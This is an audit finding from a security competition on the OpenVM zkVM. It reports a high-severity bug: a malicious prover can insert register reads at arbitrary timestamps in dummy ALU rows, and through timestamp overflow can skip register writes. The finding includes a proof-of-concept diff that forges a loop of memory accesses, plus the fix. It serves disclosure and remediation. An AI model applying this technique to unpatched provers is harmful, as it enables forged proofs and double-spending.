---
tags:
  - lang/rust
  - lang/solidity
  - sector/bridge
  - sector/lending
  - sector/options
  - sector/zk
  - platform/cantina
  - has/poc
  - severity/high
protocol: "[[OpenVM]]"
auditors:
  - georg
report: "https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf"
genome:
  - "[[timestamp-dependence]]"
  - "[[known-pattern]]"
---
# Inserted register reads at arbitrary timestamps 

- id: 53417
- impact: HIGH
- protocol: OpenVM
- reporter: georg (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf

## Summary


The bug report discusses a vulnerability in the ALU instructions of a computer program. The bug allows a malicious user to manipulate the program's memory reads at any time, even when the program is not supposed to be able to do so. This can lead to a targeted attack where the user can skip any register write in the program, causing it to behave differently than intended. The report provides a detailed explanation of how the bug works and its potential impact. It also includes a proof of concept and recommendations for fixing the bug. The bug has been fixed in the latest version of the program. 

## Details

## Context
(No context files were provided by the reviewer)

## Summary
In the "dummy rows" of ALU instructions (those with `is_valid = 0`), the prover can execute register memory reads at arbitrary timestamps. In combination with the finding "timestamp can overflow" (the timestamp can overflow the field), this allows for a very targeted attack where the malicious prover can choose to skip any register write in the computation.

## Finding Description
In the `Rv32BaseAluAdapterAir::evaluate` implementation, the `rs2_as` flag is used to toggle a memory read. The idea here is that `rs2_as` is constrained via the execution bridge and contains a flag whether the second argument comes from a register (`rs2_as = 1`) or is an immediate value (`rs2_as = 0`). The execution bridge is connected to the program being executed, which cannot be modified by a malicious prover.

However, `rs2_as` can be `1` even if `ctx.instruction.is_valid = 0`. This is problematic because, with `is_valid = 0`, most constraints and the execution bridge are disabled. As a result, most cells in the current row are unconstrained, including:
- The current timestamp.
- The value being read.
- The address being read.

As a result, a malicious prover can insert register read operations at any time step, to any register.

## Skipping Any Register Write
By itself, this might not sound problematic because it is not possible to write to the register memory. However, in combination with the finding "timestamp can overflow", this allows the prover to skip any register write they like.

To explain further, consider this graph of memory accesses to a particular register:  
*(Note that time flows from initial write towards final read)*

The memory argument works like this:
- The verifier performs a write of the initial value and a read of the final value.
- Each internal node receives the previous value and timestamp and sends the updated value and timestamp (if it is a read, the old value is constrained to equal the new value).

The prover cannot change the wiring of this graph if:
1. Each sent (timestamp, addr, value) tuple is also received (i.e., the bus argument holds).
2. The received timestamp is asserted to be strictly smaller than the sent timestamp.

However, the timestamps can overflow, which breaks the second check and means that the graph can have loops. Overflows are not trivial to provoke unless we can insert memory operations at arbitrary timestamps. In fact, timestamps can increase by `2^29` from one access to the next, which means that it is enough to overflow the field of size `p = 2^31 - 2^27 + 1` in 4 accesses.

But now, the malicious prover can include any access they like in this loop. In this example, the second read is wired to receive the value sent by the first read, ignoring the write operation that is supposed to happen in between. Checks (1) and (2) still pass, and the execution will continue as if the write never happened.

## Impact Explanation
Skipping arbitrary register writes allows the prover to completely change the output and side effects of the program being executed, in a controlled way and with a large degree of freedom. For a concrete example, if the write operation is updating account values in a smart contract execution, a prover can skip this update, allowing them to double-spend.

## Likelihood Explanation
This bug can be exploited in any program and execution. All that is needed are 4 extra rows in any of the ALU chips. Because the prover can choose the size of the chips, they can always make this work. Note that while the ALU chip is being modified, the attack allows the prover to manipulate memory accesses of any chip that interacts with registers.

## Proof of Concept
Writing the full exploit would require significant changes to OpenVM's witness generation (because it would have to generate a witness for an inconsistent memory). Here, we demonstrate that we are able to add a self-contained loop of memory accesses (as imaged above).

To run the proof of concept, apply the following diff, install, and run the Fibonacci example:

```diff
diff --git a/crates/circuits/primitives/src/assert_less_than/mod.rs b/crates/circuits/primitives/src/assert_less_than/mod.rs
index 8f9a77280..73c386a2b 100644
--- a/crates/circuits/primitives/src/assert_less_than/mod.rs
+++ b/crates/circuits/primitives/src/assert_less_than/mod.rs
@@ -238,20 +238,13 @@ impl<F: Field> TraceSubRowGenerator<F> for AssertLtSubAir {
(range_checker, x, y): (&'a VariableRangeCheckerChip, u32, u32),
lower_decomp: &'a mut [F],
) {
- debug_assert!(x < y, "assert {x} < {y} failed");
debug_assert_eq!(lower_decomp.len(), self.decomp_limbs);
- debug_assert!(
- x < (1 << self.max_bits),
- "{x} has more than {} bits",
- self.max_bits
- );
- debug_assert!(
- y < (1 << self.max_bits),
- "{y} has more than {} bits",
- self.max_bits
- );
// Note: if x < y then y - x - 1 should already have <= max_bits bits
- range_checker.decompose(y - x - 1, self.max_bits, lower_decomp);
+ let p = (1 << 31) - (1 << 27) + 1;
+ // Like the constraint system, we want to compute the difference
+ // with overflow mod p.
+ let diff = if x < y { y - x } else { y + p - x };
+ range_checker.decompose(diff - 1, self.max_bits, lower_decomp);
}
}
diff --git a/crates/vm/src/arch/integration_api.rs b/crates/vm/src/arch/integration_api.rs
index ed5501e60..b5fafaecf 100644
--- a/crates/vm/src/arch/integration_api.rs
+++ b/crates/vm/src/arch/integration_api.rs
@@ -1,6 +1,7 @@
use std::{
array::from_fn,
borrow::Borrow,
+ iter::repeat_with,
marker::PhantomData,
sync::{Arc, Mutex},
};
@@ -87,6 +88,8 @@ pub trait VmAdapterChip<F> {
memory: &OfflineMemory<F>,
);
+ fn mutate_dummy_row(&self, _row_slice: &mut [F], _index: usize, _memory: &OfflineMemory<F>) {}
+
fn air(&self) -> &Self::Air;
}
@@ -308,16 +311,39 @@ where
let memory = self.offline_memory.lock().unwrap();
+ let dummy_rows = height - num_records;
+ let insert_fake_reads = dummy_rows >= 4;
+ if insert_fake_reads {
+ println!("Inserting 4 fake reads!")
+ }
+
+ let records = self
+ .records
+ .into_iter()
+ .map(|r| Some(r))
+ .chain(repeat_with(|| None))
+ .take(height)
+ .collect::<Vec<_>>();
+ // This zip only goes through records.
+ // The padding rows between records.len()..height are filled with zeros.
values
.par_chunks_mut(width)
- .zip(self.records.into_par_iter())
- .for_each(|(row_slice, record)| {
- let (adapter_row, core_row) = row_slice.split_at_mut(adapter_width);
- self.adapter
- .generate_trace_row(adapter_row, record.0, record.1, &memory);
- self.core.generate_trace_row(core_row, record.2);
+ .zip(records.into_par_iter())
+ .enumerate()
+ .for_each(|(i, (row_slice, record))| {
+ if let Some(record) = record {
+ let (adapter_row, core_row) = row_slice.split_at_mut(adapter_width);
+ self.adapter
+ .generate_trace_row(adapter_row, record.0, record.1, &memory);
+ self.core.generate_trace_row(core_row, record.2);
+ } else {
+ // We only need 4 reads to create a loop, so use the last 4 rows.
+ if insert_fake_reads && i >= height - 4 {
+ self.adapter
+ .mutate_dummy_row(row_slice, i + 4 - height, &memory);
+ }
+ }
});
let mut trace = RowMajorMatrix::new(values, width);
diff --git a/crates/vm/src/system/memory/controller/mod.rs b/crates/vm/src/system/memory/controller/mod.rs
index de2e203c3..ee5c98ba1 100644
--- a/crates/vm/src/system/memory/controller/mod.rs
+++ b/crates/vm/src/system/memory/controller/mod.rs
@@ -756,7 +756,6 @@ impl<F: PrimeField32> MemoryAuxColsFactory<F> {
timestamp: u32,
buffer: &mut LessThanAuxCols<F, AUX_LEN>,
) {
- debug_assert!(prev_timestamp < timestamp);
self.timestamp_lt_air.generate_subrow(
(self.range_checker.as_ref(), prev_timestamp, timestamp),
&mut buffer.lower_decomp,
diff --git a/crates/vm/src/system/memory/offline.rs b/crates/vm/src/system/memory/offline.rs
index 0bebf2d04..b9fc1b194 100644
--- a/crates/vm/src/system/memory/offline.rs
+++ b/crates/vm/src/system/memory/offline.rs
@@ -31,9 +31,9 @@ pub struct MemoryRecord<T> {
pub pointer: T,
pub timestamp: u32,
pub prev_timestamp: u32,
- data: Vec<T>,
+ pub data: Vec<T>,
/// None if a read.
- prev_data: Option<Vec<T>>,
+ pub prev_data: Option<Vec<T>>,
}
impl<T> MemoryRecord<T> {
diff --git a/extensions/rv32im/circuit/src/adapters/alu.rs b/extensions/rv32im/circuit/src/adapters/alu.rs
index 097e19a28..a2451810a 100644
--- a/extensions/rv32im/circuit/src/adapters/alu.rs
+++ b/extensions/rv32im/circuit/src/adapters/alu.rs
@@ -12,7 +12,7 @@ use openvm_circuit::{
system::{
memory::{
offline_checker::{MemoryBridge, MemoryReadAuxCols, MemoryWriteAuxCols},
- MemoryAddress, MemoryController, OfflineMemory, RecordId,
+ MemoryAddress, MemoryController, MemoryRecord, OfflineMemory, RecordId,
},
program::ProgramBus,
},
@@ -281,6 +281,46 @@ impl<F: PrimeField32> VmAdapterChip<F> for Rv32BaseAluAdapterChip<F> {
))
}
+ fn mutate_dummy_row(&self, row_slice: &mut [F], index: usize, memory: &OfflineMemory<F>) {
+ let row_slice: &mut Rv32BaseAluAdapterCols<_> = row_slice.borrow_mut();
+ // Create a loop of 4 time stamps. Each one can be at most 2^29
+ // from the previous (with difference mod p).
+ let timestamps = [
+ 42,
+ 42 + (1u32 << 29),
+ 42 + (1u32 << 29) * 2,
+ 42 + (1u32 << 29) * 3,
+ ];
+ let prev_timestamp = timestamps[(index + 3) % 4];
+ let timestamp = timestamps[index];
+ println!("time_stamp: {}", timestamp);
+
+ // Set the time stamp. We can set it to any value because is_valid
+ // is zero and the execution bridge is deactivated.
+ row_slice.from_state.timestamp = F::from_canonical_u32(timestamp);
+ // Set the read flag to true. We can set it to any (binary) value
+ // because is_valid is zero and the execution bridge is deactivated.
+ row_slice.rs2_as = F::ONE;
+
+ let aux_cols_factory = memory.aux_cols_factory();
+ let f = |x| F::from_canonical_u32(x);
+ let record = MemoryRecord {
+ // The address space is constrained to be 1 (register addr space)
+ address_space: f(1),
+ // The address can be arbitrary (equals local.rs2, which is
+ // unconstrained if the execution bridge is deactivated).
+ pointer: f(24),
+ timestamp: timestamp + 1,
+ prev_timestamp: prev_timestamp + 1,
+ // Can be any value (but needs to be consistent with the
+ // previous access).
+ data: vec![f(240), f(0), f(0), f(0)],
+ // The is constrained to None (it's a memory read).
+ prev_data: None,
+ };
+ aux_cols_factory.generate_read_aux(&record, &mut row_slice.reads_aux[1]);
+ }
+
fn generate_trace_row(
&self,
row_slice: &mut [F],
```  

## Recommendation
Adding the following constraint to `Rv32BaseAluAdapterAir::evaluate` prevents the prover from adding additional memory reads in the "dummy rows" of the chip:

```rust
builder
    .when(local.rs2_as)
    .assert_one(ctx.instruction.is_valid.clone());
```

## OpenVM
Fixed in commit `c63b9af7`. We added a constraint that when `local.rs2_as` is nonzero, then `is_valid == 1`. This ensures that reading `rs2` from memory only occurs when both `local.rs2_as` and `ctx.instruction.is_valid` equal `1`, preventing arbitrary memory reads in dummy rows.

## Cantina Managed
Fix verified.
